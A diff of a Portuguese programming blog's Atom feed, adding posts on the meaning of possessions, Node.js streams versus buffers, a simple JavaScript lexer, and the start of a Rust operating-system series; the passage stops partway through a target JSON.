@@ -1,4 +1,522 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-22T23:43:15-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ItaloCobainsBlog</title><subtitle>Bem-vindo ao nosso blog, um espaço dedicado à exploração do fascinante mundo da programação, tecnologia, hacking ético e ciência da computação. Mergulhe conosco em uma jornada repleta de insights e novidades, enquanto compartilhamos nosso conhecimento e paixão por esses campos em constante evolução.</subtitle><entry><title type="html">Escrevendo um sistema operacional com rust</title><link href="http://localhost:4000/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust.html" rel="alternate" type="text/html" title="Escrevendo um sistema operacional com rust" /><published>2023-10-22T22:10:00-03:00</published><updated>2023-10-22T22:10:00-03:00</updated><id>http://localhost:4000/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust</id><content type="html" xml:base="http://localhost:4000/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust.html"><![CDATA[<p>Olá amates de low level, hoje vamos começar um longa jornada onde vou apresentar pra voces minha trajetoria escrevendo um sistema operacional simples em rust. Vou utilizar o tutorial do <a href="https://os.phil-opp.com/freestanding-rust-binary/">os.phil-opp.com</a> para seguir essa jornada vou tentar melhorar o possivel no codigo dele lembrando que não sou um programador muito experiente em rust e nem sei tanto sobre criação de OS isso vai ser apenas um experimento meu que quero compartilhar com vcs.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://italocobainsblog.com/feed.xml" rel="self" type="application/atom+xml" /><link href="http://italocobainsblog.com/" rel="alternate" type="text/html" /><updated>2023-11-28T11:01:38-03:00</updated><id>http://italocobainsblog.com/feed.xml</id><title type="html">ItaloCobainsBlog</title><subtitle>Bem-vindo ao nosso blog, um espaço dedicado à exploração do fascinante mundo da programação, tecnologia, hacking ético e ciência da computação. Mergulhe conosco em uma jornada repleta de insights e novidades, enquanto compartilhamos nosso conhecimento e paixão por esses campos em constante evolução.</subtitle><entry><title type="html">nothing’s real</title><link href="http://italocobainsblog.com/world/mind/2023/11/28/Nada-%C3%A9-real.html" rel="alternate" type="text/html" title="nothing’s real" /><published>2023-11-28T09:30:00-03:00</published><updated>2023-11-28T09:30:00-03:00</updated><id>http://italocobainsblog.com/world/mind/2023/11/28/Nada-%C3%A9-real</id><content type="html" xml:base="http://italocobainsblog.com/world/mind/2023/11/28/Nada-%C3%A9-real.html"><![CDATA[<h1 id="nada-é-real-">Nada é real ?</h1>
+
+<p><img src="/assets/nothing_is_real.jpg" alt="Imagem" /></p>
+
+<p>Isso é um sobra dos meus pensamentos referente a o mundo em que vivemos hoje em dia, aparentemente nada é real, seus ganhos,
+seus bens, sua casa nova, suas conquistas nada disso é real, tudo que vc tem é apenas um parcela de felicidade. O que eu vou falar parece estranho
+mas isso é so um fruto do meu pensamento “Bens são sentimentos”. Não estou generalizando obvio porem grande parte de nos humanos 
+nos sentimos bens por ter algo mas não so por ter algo é sim por ter algo que o outro não tem. Estamos todos imbutidos na corridas dos ratos para 
+obtermos capital para que possamos ter o que o proximo não tem e isso a troco de que ? Eu sei Eu sei vc tem que alimentar seu filho e sua esposa, eu
+não estou dizendo que vc deve para de gerar rendar so estou dizendo que talvez vc devesse abrir os olhos e ver alem do horizonte. 
+Não estamos nessa situação por que queremos tudo é arquitetado, vc so tem que ter essa mesma vida ate a sua morte pq circustancia especificas como fome e abrigo 
+tem obrigam a isso é o que te impede de gerar isso por conta propria e não ser mais escravo ? Vamos começar com o abrigo. O que te impede de construir sua propria casa de madeira
+em qualquer pedaço de terra que vc encontrar ? Sim, eu sei que vc ja sabe a resposta. O governo não deixaria e me faria sair daquela terra a força,
+para obter esse terreno vc precisa de dinheiro e para ter dinheiro vc precisa trabalhar mas para trabalhar vc precisa gastar dinheiro, dinheiro esse que vc não tem 
+entt vc se vira um devedor que trabalhar para pagar suas contas e o sonho de ser independete vai para o ralo pois nunca tera o dinheiro total para obter seus sonhos, assim
+tendo que obter seu terreno por algum outro meio que deixara em uma divida eterna te obrigando a continuar a trabalhar como um robo pelo resto de sua vida ate que vc tenha
+terminado de pagar sua divida é no final de sua vida quando não tiver mais condicoes de trabalhar vai esperar a morte chegar em um retrospectiva deprimente de quem viveu toda a vida
+como um escravo das circustancias.
+Mas esse é o melhor dos caso, nesse vc ai pode ter sorte de ter contruido um familia que te ama e vai conseguir morrer sabendo que foi amado, pior so as pessoas que nem isso conseguem,
+não conseguem se auto amar e não conseguem o amor de ninguem, esse tipo de pessoas de pessoas tem a vida mais triste possivel pq normalmente fica se humilhando por pequenas migralhas de amor/atenção
+são pessoas confusas e tristes que normalmente viram consumistar do capitalismo para sentir o minimo de endorfina e felicidade.</p>
+
+<h2 id="manipuladores">Manipuladores</h2>
+
+<p>Deixei um texto so para esses, essa tipo de pessoa normalmente ja sabe o ou tem um ideia de que não é ninguem importante e nunca vai ser
+eles ja vem com algumas tecnicas de manipulação em seu estinto, existem dois tipos os manipiladores falantes e os invisiveis, eu mesmo dei esses nomes.
+Os falantes são aquele que pelo carisma e feisão mudam as ordem os fatores da sua decisão fazendo com que vc escolhe ou faça o que elas querem mesmo que vc não tenha nenhum benecifio,
+normalmente são muito amigaveis e nunca estão sozinhos, são sempre muito sociaveis e falsos.
+Os invisiveis são os mais perigosos, embora probabilidade de vc encontrar um desses seja quase nula eles existem, são pessoas que não atingem vc diretamente as vezes
+vc nem se quer conhece elas, elas abusam de contexto, acasos e outras pessoas para te manipular.</p>
+
+<p>Esse artigo acaba aqui, eu não espero que vc comprienda as paranoias da minha cabeça.</p>
+
+<p>Bye</p>]]></content><author><name></name></author><category term="world" /><category term="mind" /><summary type="html"><![CDATA[Nada é real ?]]></summary></entry><entry><title type="html">Nodejs streams</title><link href="http://italocobainsblog.com/nodejs/coding/stream/2023/11/23/Nodejs-streams.html" rel="alternate" type="text/html" title="Nodejs streams" /><published>2023-11-23T11:30:00-03:00</published><updated>2023-11-23T11:30:00-03:00</updated><id>http://italocobainsblog.com/nodejs/coding/stream/2023/11/23/Nodejs-streams</id><content type="html" xml:base="http://italocobainsblog.com/nodejs/coding/stream/2023/11/23/Nodejs-streams.html"><![CDATA[<h1 id="stream-vs-buffer">Stream VS Buffer</h1>
+
+<p>Ambos são termos utilizados para processamento de dados, vamos ver qual a diferença ?</p>
+
+<h2 id="stream">Stream:</h2>
+
+<ul>
+  <li>Uma stream é uma sequência de elementos de dados disponibilizados ao longo do tempo</li>
+  <li>É um fluxo contínuo de dados que é processado ou consumido pedaço por pedaço.</li>
+  <li>Streams são comumente usadas para operações de entrada e saída, onde os dados são lidos de uma fonte ou gravados em uma fonte de forma contínua.</li>
+  <li>Na programação, streams podem representar várias fontes ou destinos de dados, como arquivos, conexões de rede ou até mesmo estruturas de dados em memória.</li>
+</ul>
+
+<h3 id="exemplo-de-stream-em-nodejs">Exemplo de stream em nodejs</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node:fs</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">stream</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">createReadStream</span><span class="p">(</span><span class="dl">'</span><span class="s1">exemplo.txt</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">stream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">pedaço</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">pedaço</span><span class="p">))</span>
+
+<span class="nx">stream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">end</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Leitura concluida</span><span class="dl">'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="buffer">Buffer:</h2>
+
+<ul>
+  <li>Um buffer é uma área de armazenamento temporário usada para manter dados enquanto estão sendo transferidos de um lugar para outro.</li>
+  <li>Buffers são frequentemente utilizados para gerenciar o fluxo de dados entre dois processos ou componentes que operam em velocidades diferentes ou de maneiras diferentes.</li>
+  <li>No contexto de operações de entrada/saída, um buffer pode ser usado para armazenar uma certa quantidade de dados antes que esses dados sejam lidos da stream subjacente ou gravados nela.</li>
+</ul>
+
+<h3 id="exemplo-de-buffer">Exemplo de buffer:</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="c1">// Cria um buffer de 100 bytes</span>
+
+<span class="kd">const</span> <span class="nx">arquivoEntrada</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">openSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">exemplo.txt</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">r</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">bytesRead</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readSync</span><span class="p">(</span><span class="nx">arquivoEntrada</span><span class="p">,</span> <span class="nx">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">buffer</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">bytesRead</span><span class="p">))</span>
+
+<span class="nx">fs</span><span class="p">.</span><span class="nx">closeSync</span><span class="p">(</span><span class="nx">arquivoEntrada</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="o-que-são-as-readable-writable-e-transform-do-nodejs-">O que são as Readable, Writable e Transform do nodejs ?</h2>
+
+<ul>
+  <li>
+    <p>Readable Stream</p>
+
+    <ul>
+      <li>Uma <code class="language-plaintext highlighter-rouge">Readable</code> stream é uma fonte de dados que pode ser lida por outros processos
+– Exemplo Pratico: * Imagine m servidor HTTP que transmite continuamente um dados para o cliente conforme eles estão disponiveis. Neste exemplo, a <code class="language-plaintext highlighter-rouge">Readable</code> stream poderia ser os dados que o servidor está enviado para o cliente.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Writable Stream</p>
+
+    <ul>
+      <li>Uma <code class="language-plaintext highlighter-rouge">Writable</code> stream representa um destino onde os dados podem ser escritos.</li>
+      <li>Exemplo: Considere um serviço de log que grava registros em um banco de dados e simultaneamente envia notificações para um sistema de monitoramento. A <code class="language-plaintext highlighter-rouge">Writable</code> stream poderia ser usada para escrever esse registro e enviar para o destino</li>
+    </ul>
+  </li>
+  <li>
+    <p>Transform Stream</p>
+    <ul>
+      <li>Uma <code class="language-plaintext highlighter-rouge">Transform</code> stream é uma combinação de <code class="language-plaintext highlighter-rouge">Readable</code> e <code class="language-plaintext highlighter-rouge">Writable</code>. Ela recebe dados, realiza uma transformação e os emite para um destino.</li>
+      <li>Exemplo: Suponha que vc esteja construindo um serviço de compressão/descompressão para arquivos em tempo real. A <code class="language-plaintext highlighter-rouge">Transform</code> stream poderia ser usada para comprimir dados antes de escreve-los e descomprimir dados antes de lê-los.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="exemplo-de-como-usar-o-que-foi-explicado-a-cima">Exemplo de como usar o que foi explicado a cima.</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="p">{</span> <span class="nx">createReadStream</span><span class="p">,</span> <span class="nx">createWriteStream</span> <span class="p">}</span> <span class="k">from</span>  <span class="dl">'</span><span class="s1">node:fs</span><span class="dl">'</span>
+
+<span class="k">import</span> <span class="p">{</span> <span class="nx">Transform</span><span class="p">,</span> <span class="nx">Writable</span><span class="p">,</span> <span class="nx">pipeline</span> <span class="p">}</span> <span class="k">from</span>  <span class="dl">'</span><span class="s1">node:stream</span><span class="dl">'</span>
+
+
+<span class="c1">// createReadStream ja retorna um Readable stream do arquivo lido</span>
+<span class="kd">const</span>  <span class="nx">readableStream</span>  <span class="o">=</span>  <span class="nx">createReadStream</span><span class="p">(</span><span class="dl">'</span><span class="s1">input.txt</span><span class="dl">'</span><span class="p">)</span>
+
+
+<span class="c1">// Instancia do transform que recebe um os chunks e os modifica</span>
+<span class="kd">const</span>  <span class="nx">transformStream</span>  <span class="o">=</span>  <span class="k">new</span>  <span class="nx">Transform</span><span class="p">({</span>
+
+<span class="nx">transform</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">encoding</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+
+<span class="kd">const</span>  <span class="nx">uppercased</span>  <span class="o">=</span>  <span class="nx">chunk</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">toUpperCase</span><span class="p">()</span>
+
+<span class="k">this</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">uppercased</span><span class="p">)</span>
+
+<span class="nx">callback</span><span class="p">()</span>
+
+<span class="p">}</span>
+
+<span class="p">})</span>
+
+
+<span class="c1">// Instancia do Writable que conectar os salvas os chunks em algum lugar</span>
+<span class="kd">const</span>  <span class="nx">writableStream</span>  <span class="o">=</span>  <span class="k">new</span>  <span class="nx">Writable</span><span class="p">({</span>
+
+<span class="nx">write</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">encoding</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+
+<span class="nx">createWriteStream</span><span class="p">(</span><span class="dl">'</span><span class="s1">output.txt</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">flags</span><span class="p">:</span>  <span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">}).</span><span class="nx">write</span><span class="p">(</span><span class="nx">chunk</span><span class="p">)</span>
+
+<span class="nx">callback</span><span class="p">()</span>
+
+<span class="p">}</span>
+
+<span class="p">})</span>
+
+
+<span class="c1">// pipeline faz o trajeto # Esse exemplo é sincrono.</span>
+<span class="nx">pipeline</span><span class="p">(</span>
+
+<span class="nx">readableStream</span><span class="p">,</span>
+
+<span class="nx">transformStream</span><span class="p">,</span>
+
+<span class="nx">writableStream</span><span class="p">,</span>
+
+<span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error durante a pipeline sincrona:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Pipeline sincrono concluido</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="p">)</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="nodejs" /><category term="coding" /><category term="stream" /><summary type="html"><![CDATA[Stream VS Buffer]]></summary></entry><entry><title type="html">O Que É Um Lex</title><link href="http://italocobainsblog.com/2023/11/23/O-que-%C3%A9-um-lex.html" rel="alternate" type="text/html" title="O Que É Um Lex" /><published>2023-11-23T00:00:00-03:00</published><updated>2023-11-23T00:00:00-03:00</updated><id>http://italocobainsblog.com/2023/11/23/O-que-%C3%A9-um-lex</id><content type="html" xml:base="http://italocobainsblog.com/2023/11/23/O-que-%C3%A9-um-lex.html"><![CDATA[<h1 id="o-que-é-um-lex-ou-avaliador-lexico-">O que é um <code class="language-plaintext highlighter-rouge">lex</code> ou <code class="language-plaintext highlighter-rouge">avaliador lexico</code> ?</h1>
+
+<p><code class="language-plaintext highlighter-rouge">Lexical analyzer</code> ou <code class="language-plaintext highlighter-rouge">lex</code> ou <code class="language-plaintext highlighter-rouge">avaliador léxico</code> é um processo fundamental na arquitetura de qualquer interpretador ou compilador.  Ele é responsável por analisar o <code class="language-plaintext highlighter-rouge">codigo fonte</code> ou <code class="language-plaintext highlighter-rouge">entrada de texto</code> iterando sobre cada caractere é gerando <code class="language-plaintext highlighter-rouge">tokens</code> ou <code class="language-plaintext highlighter-rouge">simbolos</code> que vão ser importante para os próximos passos de um compilador/interpretador.</p>
+
+<h2 id="como-escrever-um-lex-">Como escrever um lex ?</h2>
+
+<p>Exemplo: LexEstupido.js</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nx">Token</span> <span class="p">{</span>
+  <span class="kd">constructor</span><span class="p">(</span><span class="nx">type</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="nx">type</span><span class="p">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nx">Lexer</span> <span class="p">{</span>
+  <span class="kd">constructor</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">code</span> <span class="o">=</span> <span class="nx">code</span><span class="p">;</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nx">isWhitespace</span><span class="p">(</span><span class="nx">char</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="sr">/</span><span class="se">\s</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">char</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">isDigit</span><span class="p">(</span><span class="nx">char</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="sr">/</span><span class="se">\d</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">char</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">isAlpha</span><span class="p">(</span><span class="nx">char</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="sr">/</span><span class="se">[</span><span class="sr">a-zA-Z_</span><span class="se">]</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">char</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">getNextToken</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">char</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">];</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">isWhitespace</span><span class="p">(</span><span class="nx">char</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="o">++</span><span class="p">;</span>
+        <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">switch</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="k">this</span><span class="p">.</span><span class="nx">isDigit</span><span class="p">(</span><span class="nx">char</span><span class="p">):</span>
+          <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">parseNumber</span><span class="p">();</span>
+        <span class="k">case</span> <span class="k">this</span><span class="p">.</span><span class="nx">isAlpha</span><span class="p">(</span><span class="nx">char</span><span class="p">):</span>
+          <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">parseIdentifier</span><span class="p">();</span>
+        <span class="k">case</span> <span class="sr">/</span><span class="se">[\+\-\*\/\(\)]</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">char</span><span class="p">):</span>
+          <span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="o">++</span><span class="p">;</span>
+          <span class="k">return</span> <span class="k">new</span> <span class="nx">Token</span><span class="p">(</span><span class="nx">char</span><span class="p">,</span> <span class="nx">char</span><span class="p">);</span>
+        <span class="k">case</span> <span class="nx">char</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">:</span>
+          <span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="o">++</span><span class="p">;</span>
+          <span class="k">return</span> <span class="k">new</span> <span class="nx">Token</span><span class="p">(</span><span class="dl">'</span><span class="s1">EQUALS</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nl">default</span><span class="p">:</span>
+          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">`Erro léxico: Caractere inesperado '</span><span class="p">${</span><span class="nx">char</span><span class="p">}</span><span class="s2">' na posição </span><span class="p">${</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+          <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Fim do código</span>
+    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nx">parseNumber</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">isDigit</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">]))</span> <span class="p">{</span>
+      <span class="nx">value</span> <span class="o">+=</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">];</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">new</span> <span class="nx">Token</span><span class="p">(</span><span class="dl">'</span><span class="s1">NUMBER</span><span class="dl">'</span><span class="p">,</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="mi">10</span><span class="p">));</span>
+  <span class="p">}</span>
+
+  <span class="nx">parseIdentifier</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">isAlpha</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">])</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">isDigit</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">])))</span> <span class="p">{</span>
+      <span class="nx">value</span> <span class="o">+=</span> <span class="k">this</span><span class="p">.</span><span class="nx">code</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="p">];</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">position</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">new</span> <span class="nx">Token</span><span class="p">(</span><span class="dl">'</span><span class="s1">ID</span><span class="dl">'</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">tokenize</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="p">[];</span>
+
+    <span class="kd">let</span> <span class="nx">token</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">((</span><span class="nx">token</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getNextToken</span><span class="p">())</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">tokens</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nx">tokens</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Exemplo de uso</span>
+<span class="kd">const</span> <span class="nx">codigoFonte</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x = 10 + 20 * (30 - 5)</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">lexer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Lexer</span><span class="p">(</span><span class="nx">codigoFonte</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">tokensResultantes</span> <span class="o">=</span> <span class="nx">lexer</span><span class="p">.</span><span class="nx">tokenize</span><span class="p">();</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">tokensResultantes</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>Primeiramente, criamos um ‘Token’, uma estrutura que armazena a identidade de cada caractere. É importante observar que um ‘Token’ pode conter mais atributos do que os exemplificados aqui; meu exemplo é simplificado.</p>
+
+<p>Em seguida, começamos com a classe que recebe o código no construtor. Posteriormente, o método ‘tokenize’ é implementado como o principal da classe, responsável por percorrer o código fonte. O método ‘getNextToken’ é encarregado de identificar o caractere atual e atribuí-lo a um ‘Token’. Os demais métodos servem apenas como validadores de strings. Ao final, o vetor de ‘Tokens’ é retornado.”</p>]]></content><author><name></name></author><summary type="html"><![CDATA[O que é um lex ou avaliador lexico ?]]></summary></entry><entry><title type="html">Escrevendo um sistema operacional com rust part 3</title><link href="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/11/06/Escrevendo-um-sistema-operacional-part-3.html" rel="alternate" type="text/html" title="Escrevendo um sistema operacional com rust part 3" /><published>2023-11-06T11:30:00-03:00</published><updated>2023-11-06T11:30:00-03:00</updated><id>http://italocobainsblog.com/ciencia/programacao/os/rust/2023/11/06/Escrevendo-um-sistema-operacional-part-3</id><content type="html" xml:base="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/11/06/Escrevendo-um-sistema-operacional-part-3.html"><![CDATA[<p>No final teremos o json assim.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"llvm-target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64-unknown-none"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"data-layout"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e-m:e-i64:64-f80:128-n8:16:32:64-S128"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"arch"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"target-endian"</span><span class="p">:</span><span class="w"> </span><span class="s2">"little"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"target-pointer-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"64"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"target-c-int-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"32"</span><span class="p">,</span><span class="w">
